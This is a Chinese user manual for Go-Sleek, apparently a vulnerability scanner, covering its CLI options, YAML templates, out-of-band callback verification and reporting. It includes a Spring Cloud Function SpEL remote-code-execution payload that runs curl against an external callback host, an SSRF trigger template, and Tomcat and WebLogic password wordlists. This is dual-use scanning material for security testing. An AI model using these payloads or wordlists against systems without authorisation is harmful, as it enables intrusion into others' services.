# Go-Sleek 使用手册

> 版本：v1.3.1  
> 最后更新：2026-08-17

---

## 目录

1. [快速入门](#1-快速入门)
2. [安装与编译](#2-安装与编译)
3. [基本扫描](#3-基本扫描)
4. [模板管理](#4-模板管理)
5. [参数详解](#5-参数详解)
6. [高级功能](#6-高级功能)
7. [OOB 带外验证](#7-oob-带外验证)
8. [工作流模板](#8-工作流模板)
9. [输出与报告](#9-输出与报告)
10. [断点续扫](#10-断点续扫)
11. [代理与网络](#11-代理与网络)
12. [全局请求头](#12-全局请求头)
13. [脱敏输出](#13-脱敏输出)
14. [请求复放](#14-请求复放)
15. [配置管理](#15-配置管理)
16. [常见问题](#16-常见问题)

---

## 1. 快速入门

### 1.1 最简单的扫描

```bash
# 扫描单个目标
gosleek scan -t http://example.com

# 从文件读取目标列表
gosleek scan -l targets.txt
```

### 1.2 扫描指定漏洞

```bash
# 使用模板 ID 扫描
gosleek scan -t http://example.com -id CVE-2021-44228-log4j-rce

# 使用标签筛选
gosleek scan -t http://example.com --tags cve,rce

# 只扫描高危漏洞
gosleek scan -t http://example.com --severity high
```

### 1.3 查看所有模板

```bash
# 列出所有模板和插件
gosleek list

# 仅列出 Go 插件
gosleek list --plugins-only

# 筛选特定严重度
gosleek list --severity critical
```

---

## 2. 安装与编译

### 2.1 从源码编译

```bash
git clone <repository>
cd go-sleek
go build -o gosleek ./cmd/gosleek/
```

### 2.2 目录结构

```
go-sleek/
├── cmd/gosleek/        # CLI 入口
├── configs/            # 配置文件
│   ├── config.yaml     # 全局配置
│   └── oob.yaml        # OOB 独立配置
├── docs/               # 文档
├── internal/           # 核心代码
│   ├── engine/         # 扫描引擎
│   ├── httpclient/     # HTTP 客户端
│   ├── matcher/        # 匹配引擎
│   ├── oob/            # OOB Provider 实现
│   ├── placeholder/    # 占位符引擎
│   ├── ratelimit/      # 限速器
│   ├── template/       # 模板加载与校验
│   ├── workflow/       # 工作流执行
│   └── output/         # 输出系统
├── pkg/types/          # 共享类型定义
├── plugins/            # Go 插件实现
├── templates/          # YAML 模板
│   └── security/       # 安全检测模板
├── wordlists/          # 字典文件
└── main.go             # 程序入口
```

---

## 3. 基本扫描

### 3.1 扫描单个目标

```bash
gosleek scan -t http://example.com
```

### 3.2 扫描多个目标

```bash
# 命令行指定多个目标
gosleek scan -t http://example1.com -t http://example2.com

# 从文件读取（每行一个 URL）
gosleek scan -l targets.txt
```

### 3.3 从标准输入读取

```bash
echo 'http://example.com' | gosleek scan -t -
cat targets.txt | gosleek scan -t -
```

### 3.4 详细输出级别

```bash
# 默认级别 - 显示 Banner、配置、进度、结果
gosleek scan -t http://example.com

# -v 详细模式 - 每步进度、跳过原因、信息提示
gosleek scan -t http://example.com -v

# -vv 极详细模式 - 每个请求/响应详情、matcher 命中细节
gosleek scan -t http://example.com -vv
```

### 3.5 静默模式

```bash
# 仅输出命中结果卡片
gosleek scan -t http://example.com --silent
```

---

## 4. 模板管理

### 4.1 列出所有模板

```bash
# 列出所有 YAML 模板和 Go 插件
gosleek list

# 仅列出 Go 插件
gosleek list --plugins-only
```

### 4.2 筛选模板

```bash
# 按 ID 筛选
gosleek list -id CVE-2021-44228-log4j-rce

# 按标签筛选
gosleek list --tags cve,rce

# 按严重度筛选
gosleek list --severity critical
gosleek list --severity high,critical

# 组合筛选
gosleek list -id CVE-2021-44228 --tags rce --severity critical
```

### 4.3 校验模板

```bash
# 校验整个模板目录
gosleek validate templates/

# 校验指定文件
gosleek validate templates/cve-2021-44228-log4j-rce.yaml
```

校验输出示例：
```
[有效]   CVE-2021-44228-log4j-rce  (Apache Log4j2 RCE (JNDI Injection))
[有效]   CVE-2022-22947            (Spring Cloud Gateway Actuator SpEL RCE)
[警告]   git-repo-exposure         extractor not referenced by any matcher
```

### 4.4 常用模板 ID

| ID | 漏洞 | 严重度 |
|----|------|--------|
| CVE-2021-44228-log4j-rce | Log4Shell JNDI 注入 | CRITICAL |
| CVE-2022-22947 | Spring Cloud Gateway SpEL RCE | CRITICAL |
| CVE-2022-22963 | Spring Cloud Function SpEL RCE | CRITICAL |
| CVE-2022-22963-multi | 多 Provider OOB 验证 | CRITICAL |
| sqli-time-based-blind | 时间盲注 SQL 注入 | HIGH |
| spring-boot-actuator-unauth | Actuator 未授权访问 | HIGH |
| jwt-auth-bypass-workflow | JWT 认证绕过 | HIGH |

---

## 5. 参数详解

### 5.1 目标参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `-t`, `--target` | 单个目标 URL（可多次） | `-t http://example.com` |
| `-l`, `--list` | 目标列表文件 | `-l targets.txt` |
| `-t -`, `--stdin` | 从标准输入读取目标 | `echo url \| gosleek scan -t -` |

### 5.2 筛选参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `-id`, `--tid` | 指定模板/插件 ID | `-id CVE-2021-44228` |
| `--tags` | 按标签筛选 | `--tags cve,rce` |
| `--severity` | 按严重度筛选 | `--severity critical` |
| `-e`, `--exclude` | 排除指定 ID | `-e CVE-2021-44228` |
| `-s`, `--filter-severity` | 结果过滤：仅保留指定严重度 | `-s high,critical` |
| `--filter-tags` | 结果过滤：仅保留指定标签 | `--filter-tags cve` |

### 5.3 性能参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-c`, `--concurrency` | 并发 worker 数 | 25 |
| `-rl`, `--rate-limit` | 每秒请求数限制 | 150 |
| `--timeout` | 请求超时（秒） | 10 |

### 5.4 输出参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `-o`, `--output` | 结果输出文件 | `-o results.json` |
| `-f`, `--format` | 输出格式 | `-f json` |
| `--output-dir` | 结果输出目录（自动时间戳） | `--output-dir ./reports/` |
| `-v` | 详细输出 | `-v` |
| `-vv` | 极详细输出 | `-vv` |
| `--silent` | 静默模式 | `--silent` |
| `--redact` | 脱敏输出（遮蔽密钥/token） | `--redact` |

支持的输出格式：`json`、`txt`、`sarif`、`html`、`csv`、`markdown`

### 5.5 网络参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `-p`, `--proxy` | HTTP/SOCKS5 代理 | `-p socks5://127.0.0.1:1080` |
| `-k`, `--verify-ssl` | 启用 TLS 证书校验 | `-k` |
| `--follow-redirects` | 跟随重定向 | `--follow-redirects` |
| `--allow-external-hosts` | 允许 Host 头重定向到外部主机 | `--allow-external-hosts` |
| `-H`, `--header` | 全局请求头注入 | `-H "X-Auth: token"` |

### 5.6 Matcher 类型

gosleek 支持以下 matcher 类型：

| 类型 | 说明 | 示例 |
|------|------|------|
| `status` | HTTP 状态码匹配 | `status: [200, 500]` |
| `word` | 正文/头/全部子串匹配 | `words: ["vulnerable"]` |
| `regex` | 正则表达式匹配 | `regex: ["CVE-\d+-\d+"]` |
| `header` | 响应头匹配 | `header: ["X-Powered-By: PHP"]` |
| `size` | 响应体大小匹配 | `size: [">1000", "<50000"]` |
| `time` | 响应时间匹配 | `time: ">5"` |
| `binary` | 二进制/Hex 匹配 | `binary: ["d0cf11"]` |
| `dsl` | DSL 表达式 | `dsl: ["status_code == 200"]` |
| `json-word` | JSON 数组字段匹配 | `json-path: data, json-field: name` |
| `json-2darray` | JSON 二维数组匹配 | `json-2darray-column: 0` |

**Matcher 条件：**
- `matchers-condition: and` — 所有 matcher 都匹配才成功
- `matchers-condition: or` — 任一 matcher 匹配就成功（默认）

**Matcher 高级属性：**
- `condition: and/or` — 单个 matcher 内部的多个条件关系
- `negative: true` — 取反匹配
- `case-insensitive: true` — 大小写不敏感
- `encoding: url/base64/hex` — 编码处理

### 5.7 Extractor 类型

| 类型 | 说明 |
|------|------|
| `regex` | 从响应中提取正则匹配组 |
| `word` | 从响应中提取指定关键词 |
| `kval` | 从 URL 参数/表单中提取键值 |
| `json` | 从 JSON 响应中提取字段 |
| `cookie` | 从 Set-Cookie 头提取 |

### 5.8 Wordlist 功能

模板支持通过 wordlist 字段注入字典：

```yaml
http:
  - raw: |
      GET /admin/{{password}} HTTP/1.1
      Host: {{Hostname}}
    wordlist:
      - key: password
        path: wordlists/tomcat-pass.txt
        encoding: url  # 可选: url/base64/hex
```

---

## 6. 高级功能

### 6.1 Fingerprint 预过滤

模板可通过 `fingerprints` 字段指定指纹预过滤规则，只有在目标匹配指纹时才执行检测：

```yaml
fingerprints:
  - title: "Apache Tomcat"
    header:
      - "Server: Apache-Coyote/1.1"
  - title: "Spring Boot"
    header:
      - "X-Application-Context"
```

### 6.2 条件执行 (Run-If)

请求块可通过 `run-if` 条件执行：

```yaml
http:
  - raw: |
      GET /actuator/env HTTP/1.1
      Host: {{Hostname}}
    run-if: "{{status_code} == 200}"
```

### 6.3 变量定义

模板可定义变量供后续使用：

```yaml
variables:
  admin_path: "/admin"
  api_version: "v1"
```

变量可通过 `{{变量名}}` 引用。

### 6.4 停止匹配

```yaml
# 模板级停止
stop-at-first-match: true

# 请求级停止
http:
  - raw: |...
    stop-at-first-match: true
```

---

## 7. OOB 带外验证

### 7.1 什么是 OOB

OOB（Out-of-Band）验证用于检测无回显漏洞。漏洞利用后通过 DNS/HTTP 回调到第三方服务，再由扫描器查询回调记录来确认漏洞存在。

### 7.2 支持的 Provider

| Provider | 域名 | 配置要求 |
|----------|------|----------|
| ceye | ceye.io | 需要 token + domain |
| dnslog | dnslog.cn | 自动获取子域名 |
| callbackred | callback.red | 自动获取 key |

### 7.3 占位符

| 占位符 | 说明 | ceye | dnslog | callbackred |
|--------|------|------|--------|-------------|
| `{{oob}}` | 完整回连子域 | `abc123.ceye.io` | `abc123.dnslog.cn` | `abc123.callback.red` |
| `{{oob_label}}` | 唯一标签 | `abc123` | `abc123` | `abc123` |
| `{{oob_token}}` | provider 凭据 | API token | PHPSESSID | UUID key |
| `{{oob_domain}}` | provider 域名 | `ceye.io` | `dnslog.cn` | `callback.red` |

### 7.4 命令行启用 OOB

```bash
# ceye（需要 token 和 domain）
gosleek scan -t http://example.com --oob --oob-provider ceye --ceye-key <token> --ceye-domain <domain>

# dnslog（无需额外配置）
gosleek scan -t http://example.com --oob --oob-provider dnslog

# callbackred（无需额外配置，但需要 --allow-external-hosts）
gosleek scan -t http://example.com --oob --oob-provider callbackred --allow-external-hosts
```

### 7.5 配置文件自动启用

在 `configs/config.yaml` 中配置：

```yaml
oob:
  enabled: true
  provider: ceye      # ceye / dnslog / callbackred
  ceye:
    token: "your-token"
    domain: "your.ceye.io"
```

配置 `enabled: true` 后无需 `--oob` 命令行参数即可自动启用。

### 7.6 OOB 配置优先级

```
命令行参数 > 配置文件 > 环境变量
```

Token 优先级：`--ceye-key` > `CEYE_TOKEN` 环境变量 > `config.yaml` > `oob.yaml`

### 7.7 SSRF 保护

使用外部 Provider 时，由于回调域名与目标不同，`--allow-external-hosts` 参数必须开启：

```bash
gosleek scan -t http://example.com --oob --oob-provider dnslog --allow-external-hosts
```

---

## 8. 工作流模板

### 8.1 什么是工作流

工作流模板包含多个 HTTP 请求步骤，按依赖关系顺序执行。每个步骤可声明前置步骤（`requires`）、延迟时间（`delay`）和 provider 类型（`provider`）。

### 8.2 工作流语法

```yaml
workflow:
  - name: trigger           # 步骤名称
    http:                   # HTTP 请求列表
      - raw: |...
        timeout: 10
        matchers-condition: or
        matchers:
          - type: status
            status: [200, 500]

  - name: verify            # 验证步骤
    requires: [trigger]     # 依赖 trigger 步骤完成
    delay: 5                # 等待 5 秒
    http:
      - raw: |...
```

### 8.3 多 Provider 工作流（推荐）

一个模板可同时支持多种 OOB Provider：

```yaml
id: CVE-2022-22963-multi
name: Spring Cloud Function SpEL Injection (Multi-Provider OOB)
workflow:
  - name: trigger
    http:
      - raw: |
          POST /functionRouter HTTP/1.1
          Host: {{Hostname}}
          spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl {{oob}}")
          Content-Type: text/plain

          test
        matchers-condition: or
        matchers:
          - type: status
            status: [200, 201, 500, 400, 404, 502]

  - name: verify-dns-ceye
    requires: [trigger]
    delay: 5
    provider: ceye
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]

  - name: verify-dns-dnslog
    requires: [trigger]
    delay: 5
    provider: dnslog
    http:
      - raw: |
          GET /getrecords.php?domain={{oob}} HTTP/1.1
          Host: 47.244.138.18
          Cookie: PHPSESSID={{oob_token}}
        matchers:
          - type: json-2darray
            json-2darray-column: 0
            words: ["{{oob_label}}"]

  - name: verify-dns-callbackred
    requires: [trigger]
    delay: 5
    provider: callbackred
    http:
      - raw: |
          POST / HTTP/1.1
          Host: callback.red
          Content-Type: application/x-www-form-urlencoded

          key={{oob_token}}
        matchers:
          - type: json-word
            json-path: data
            json-field: subdomain
            words: ["{{oob_label}}"]
```

引擎会根据当前激活的 provider 自动跳过不匹配的 verify 步骤。

### 8.4 模板级 Provider 声明

如果模板硬编码使用特定 provider，可在模板级别声明：

```yaml
id: CVE-2022-22963-dnslog
oob-provider: dnslog    # 此模板使用 dnslog，即使全局配置是 ceye
```

这确保 trigger 和 verify 步骤使用相同的 provider 凭据。

---

## 9. 输出与报告

### 9.1 控制台输出

gosleek 支持 3 级控制台输出：

- **默认级别**：显示 Banner、配置摘要、模板加载、进度、命中结果卡片
- **`-v`**：额外显示每步请求/响应摘要、matcher 结果、跳过原因
- **`-vv`**：显示完整请求/响应包（Burp Suite 风格）

### 9.2 文件输出

```bash
# JSON 格式
gosleek scan -t http://example.com -o results.json -format json

# HTML 报告
gosleek scan -t http://example.com -o report.html -format html

# Markdown 报告
gosleek scan -t http://example.com -o report.md -format markdown

# SARIF 格式（CI/IDE 集成）
gosleek scan -t http://example.com -o results.sarif -format sarif

# CSV 格式
gosleek scan -t http://example.com -o results.csv -format csv

# 自动时间戳目录
gosleek scan -t http://example.com --output-dir ./reports/
```

### 9.3 结构化日志

```bash
# 同时输出到控制台和 JSON 文件
gosleek scan -t http://example.com -log-file gosleek.log -log-level info
```

日志格式为 JSON Lines，每行一条记录，便于日志分析工具处理。

### 9.4 结果过滤

```bash
# 只保留 critical 和 high 的结果
gosleek scan -t http://example.com -s critical,high

# 只保留包含 cve 标签的结果
gosleek scan -t http://example.com --filter-tags cve
```

---

## 10. 断点续扫

### 10.1 保存状态

扫描时使用 `-resume` 参数：

```bash
# 首次扫描并保存状态
gosleek scan -t http://example.com -resume state.json
```

### 10.2 恢复扫描

```bash
# 从保存的状态恢复
gosleek scan -t http://example.com -resume state.json
```

### 10.3 工作原理

- 每个 `target|templateID` 对完成后记录到状态文件
- 恢复时跳过已完成的对
- 状态文件格式为 JSON

---

## 11. 代理与网络

### 11.1 HTTP 代理

```bash
gosleek scan -t http://example.com -p http://127.0.0.1:8080
```

### 11.2 SOCKS5 代理

```bash
gosleek scan -t http://example.com -p socks5://127.0.0.1:1080
```

### 11.3 带认证的代理

```bash
gosleek scan -t http://example.com -p http://user:pass@10.0.0.1:8080
```

### 11.4 TLS 证书校验

```bash
# 默认跳过证书校验
gosleek scan -t https://example.com

# 启用证书校验
gosleek scan -t https://example.com -k
```

### 11.5 重定向控制

```bash
# 默认跟随重定向（最多 3 次）
gosleek scan -t http://example.com

# 全局关闭重定向
gosleek scan -t http://example.com --follow-redirects=false
```

---

## 12. 全局请求头

通过 `-H` 参数向所有请求注入自定义 Header：

```bash
# 注入单个 Header
gosleek scan -t http://example.com -H "X-Auth: secret-token"

# 注入多个 Header
gosleek scan -t http://example.com -H "X-Auth: token" -H "X-Client: gosleek"
```

全局 Header 会合并到每个请求中，不覆盖模板中已有的同名 Header。

---

## 13. 脱敏输出

使用 `--redact` 参数可遮蔽结果中的敏感信息：

```bash
gosleek scan -t http://example.com --redact
```

脱敏范围：证据中的密码、token、密钥等敏感字段。

---

## 14. 请求复放

### 14.1 基本用法

```bash
# 从文件复放请求
gosleek replay request.txt

# 指定目标
gosleek replay request.txt -t http://example.com
```

### 14.2 编辑后复放

```bash
# 编辑请求后再发送
gosleek replay request.txt -e
```

### 14.3 保存响应

```bash
# 保存响应到目录
gosleek replay request.txt -o ./responses/

# 美化 JSON 输出
gosleek replay request.txt -p
```

### 14.4 从扫描结果提取

```bash
# 从 JSON 结果提取请求
cat results.json | jq -r '.[0]["raw-request"]' > request.txt
gosleek replay request.txt
```

---

## 15. 配置管理

### 15.1 配置文件位置

gosleek 按以下顺序查找配置文件：
1. `configs/config.yaml`
2. `config.yaml`（当前目录）

### 15.2 全局配置 (config.yaml)

```yaml
# HTTP 默认设置
user-agent: "Mozilla/5.0 (compatible; gosleek/1.0)"
default-timeout: 10
max-redirects: 3

# 并发与限流
concurrency: 25
rate-limit: 150

# 重试与退避
max-retries: 2
retry-backoff: "2s"

# 模板目录
template-dir: "templates"

# 输出与日志
log-file: "logs/gosleek.log"
log-level: "info"

# OOB 配置
oob:
  enabled: true
  provider: ceye
  ceye:
    token: "your-token"
    domain: "your.ceye.io"
  dnslog: {}
  callbackred: {}
```

### 15.3 OOB 独立配置 (oob.yaml)

```yaml
oob:
  enabled: true
  provider: ceye

  ceye:
    token: "your-token"
    domain: "your.ceye.io"
    api-url: "https://api.ceye.io/v1/records"
    poll-interval: "2s"
    poll-timeout: "10s"

  dnslog: {}

  callbackred: {}
```

### 15.4 配置优先级

```
命令行参数 > config.yaml > oob.yaml > 环境变量 > 默认值
```

具体字段优先级：

| 字段 | 优先级顺序 |
|------|-----------|
| `oob.enabled` | 命令行 `--oob` > config.yaml > oob.yaml |
| `oob.provider` | 命令行 `--oob-provider` > config.yaml > oob.yaml |
| `ceye.token` | 命令行 `--ceye-key` > 环境变量 `CEYE_TOKEN` > config.yaml > oob.yaml |
| `ceye.domain` | 命令行 `--ceye-domain` > 环境变量 `CEYE_DOMAIN` > config.yaml > oob.yaml |

### 15.5 配置文件自动启用 OOB

在 `config.yaml` 中设置 `oob.enabled: true` 后，无需 `--oob` 命令行参数即可自动启用 OOB 功能。

### 15.6 模板级 Provider 声明

模板可通过 `oob-provider` 字段声明期望的 OOB Provider：

```yaml
id: CVE-2022-22963-dnslog
oob-provider: dnslog
```

即使全局配置使用 ceye，此模板也会使用 dnslog provider。

### 15.7 多 Provider 单模板（推荐）

使用 `provider` 字段在每个 workflow step 中声明 provider：

```yaml
- name: verify-dns-ceye
  provider: ceye
  http:
    - raw: |
        GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
        Host: api.ceye.io
      matchers:
        - type: json-word
          json-path: data
          json-field: name
          words: ["{{oob_label}}"]

- name: verify-dns-dnslog
  provider: dnslog
  http:
    - raw: |
        GET /getrecords.php?domain={{oob}} HTTP/1.1
        Host: 47.244.138.18
        Cookie: PHPSESSID={{oob_token}}
      matchers:
        - type: json-2darray
          json-2darray-column: 0
          words: ["{{oob_label}}"]
```

引擎会自动跳过与当前 provider 不匹配的 step。

---

## 16. 常见问题

### 16.1 OOB 验证失败

**问题**：使用 dnslog/callbackred 时，verify 步骤返回空响应。

**原因**：`io.LimitReader(resp.Body, 0)` 在默认 `maxBodySize=0` 时消耗了所有响应数据。

**解决**：已修复。确保使用最新版本的 gosleek。

### 16.2 Provider 不匹配

**问题**：全局配置 dnslog，但模板硬编码使用 ceye API。

**解决**：
- 方案 1：在模板中添加 `oob-provider: ceye`
- 方案 2：使用多 Provider 模板（如 `CVE-2022-22963-multi`）

### 16.3 SSRF 保护

**问题**：使用外部 Provider 时报错 "不允许外部 Host 重定向"。

**解决**：添加 `--allow-external-hosts` 参数。OOB Provider 必须开启此选项。

### 16.4 验证模板错误

**问题**：`invalid matcher type: "json-2darray"`

**解决**：确保 `internal/template/validate.go` 包含 `json-2darray` 在合法类型列表中：
```go
validTypes := map[string]bool{
    "status": true, "word": true, "regex": true, "header": true,
    "size": true, "time": true, "binary": true, "dsl": true,
    "json-word": true, "json-2darray": true,
}
```

### 16.5 输出目录自动生成

```bash
# --output-dir 会自动生成带时间戳的文件名
gosleek scan -t http://example.com --output-dir ./reports/
# 输出: ./reports/2026-08-17_10-30-00_results.json
```

---

## 附录 A：模板示例

### A.1 简单模板

```yaml
id: simple-test
name: Simple HTTP Test
description: 简单 HTTP 请求测试
severity: info
tags: [test]

http:
  - raw: |
      GET / HTTP/1.1
      Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["Welcome"]
```

### A.2 OOB 模板

```yaml
id: oob-test
name: OOB Test
severity: critical
tags: [oob, test]
oob-provider: ceye

workflow:
  - name: trigger
    http:
      - raw: |
          GET /?url=http://{{oob}} HTTP/1.1
          Host: {{Hostname}}
        matchers:
          - type: status
            status: [200]

  - name: verify
    requires: [trigger]
    delay: 5
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
```

---

## 附录 B：插件说明

### B.1 内置插件

| ID | 名称 | 严重度 | 说明 |
|----|------|--------|------|
| CVE-2022-22947-go | Spring Cloud Gateway SpEL RCE | CRITICAL | Go 插件实现 |
| CVE-2022-22963-go | Spring Cloud Function SpEL OOB | CRITICAL | Go 插件实现 |
| jwt-weak-secret-bruteforce | JWT 弱密钥爆破 | HIGH | Go 插件实现 |

### B.2 使用插件

```bash
# 仅运行插件
gosleek scan -t http://example.com --plugins-only

# 指定插件
gosleek scan -t http://example.com --plugin CVE-2022-22947-go

# 指定多个插件
gosleek scan -t http://example.com --plugin CVE-2022-22947-go,CVE-2022-22963-go
```

---

## 附录 C：字典文件

项目内置字典文件位于 `wordlists/` 目录：

| 文件 | 用途 |
|------|------|
| `tomcat-pass.txt` | Tomcat Manager 密码字典 |
| `tomcat-users.txt` | Tomcat Manager 用户名字典 |
| `weblogic-pass.txt` | WebLogic 密码字典 |
| `weblogic-users.txt` | WebLogic 用户名字典 |

---

*文档版本 v1.3.1 — 2026-08-17*
